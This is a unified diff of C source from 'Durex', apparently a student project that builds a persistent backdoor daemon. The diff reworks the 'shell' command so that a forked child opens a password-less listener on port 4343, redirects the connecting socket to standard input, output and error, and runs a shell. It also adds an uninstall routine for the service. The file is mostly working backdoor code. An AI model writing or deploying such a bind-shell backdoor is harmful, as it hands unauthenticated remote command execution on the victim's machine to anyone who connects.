@@ -6,18 +6,18 @@
 /*   By: banthony </var/mail/banthony>              +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2019/11/14 12:51:21 by banthony          #+#    #+#             */
-/*   Updated: 2019/11/19 17:36:50 by banthony         ###   ########.fr       */
+/*   Updated: 2019/11/20 17:11:00 by abara            ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
 #include "server.h"
-
+#include "Durex.h"
 extern char **environ;
 
 static t_bool	server_cmd_help(t_client *client, t_server *server)
 {
 	char *help_content =	"Durex commands:\n"
-							"\t'help' or ?''\t- Show this message.\n"
+							"\t'help' or '?'\t- Show this message.\n"
 							"\t'exit'\t\t- Quit Durex.\n"
 							"\t'shell'\t\t- Spawn a shell on port 4343.\n"
 							"\t'uninstall'\t- Uninstall Durex.\n";
@@ -45,27 +45,32 @@ static t_bool	server_cmd_shell(t_client *client, t_server *server)
 	// Child
 	else if (pid == 0)
 	{
-		close(server->socket);
+		ft_memset(&remote_shell, 0, sizeof(remote_shell));
 		remote_shell.require_pass = false;
+		close(server->socket);
 		if (create_server(&remote_shell, 4343, 1))
+		{
+			send_text("\033[32m•\033[0m Done.\n", client->socket);
+			close(client->socket);
 			if (new_client(&remote_shell))
 			{
 				clt = (t_client*)remote_shell.client_lst->content;
-				close(client->socket);
 				dup2(clt->socket, 0);
 				dup2(clt->socket, 1);
 				dup2(clt->socket, 2);
 				execve(sh[0], sh, environ);
 			}
-		durex_log("The remote shell has failed.", LOG_WARNING);
+		}
+		send_text("\033[31m•\033[0m Failed, wait and retry.\n", client->socket);
 		close(client->socket);
-		close(remote_shell.socket);
-		close(clt->socket);
+		durex_log("The remote shell has failed.", LOG_WARNING);
+		exit(EXIT_FAILURE); // kill daemon
 	}
 	// Father
 	else
 	{
 		send_text("\033[33m•\033[0m Spawning a shell on port 4343 ...\n", client->socket);
+		sleep(1);
 		durex_log("Mefait accomplit!", LOG_INFO);
 	}
 	return (true);
@@ -90,18 +95,24 @@ static t_bool	server_cmd_uninstall(t_client *client, t_server *server)
 {
 	if (!server || !client)
 		return (false);
-	send_text("Uninstall Durex [wip].\n", client->socket);
-	durex_log("Uninstall Durex [wip]", LOG_WARNING);
+	if (uninstall_service())
+	{
+		send_text("Uninstall durex ... \033[32m•\033[0m Done.\n", client->socket);
+		durex_log("durex service has been removed from system.", LOG_WARNING);
+		return (false);
+	}
+	send_text("Uninstall durex ... \033[31m•\033[0m Failed.\n", client->socket);
+	durex_log("durex uninstall has failed.", LOG_WARNING);
 	return (true);
 }
 
 static const t_cmd g_server_cmd[SERVER_CMD_NUMBER] =
 {
- [HELP] = {"help", server_cmd_help},
- [HELP_ALIAS] = {"?", server_cmd_help},
- [UNINSTALL] = {"uninstall", server_cmd_uninstall},
- [SHELL] = {"shell", server_cmd_shell},
- [EXIT] = {"exit", server_cmd_exit},
+	[HELP] = COMMAND(help),
+ 	[HELP_ALIAS] = {"?", server_cmd_help},
+	[UNINSTALL] = COMMAND(uninstall),
+	[SHELL] = COMMAND(shell),
+	[EXIT] = COMMAND(exit),
 };
 
 void	server_command_handler(char *raw_cmd, size_t cmd_size, t_server *server, t_client *client)
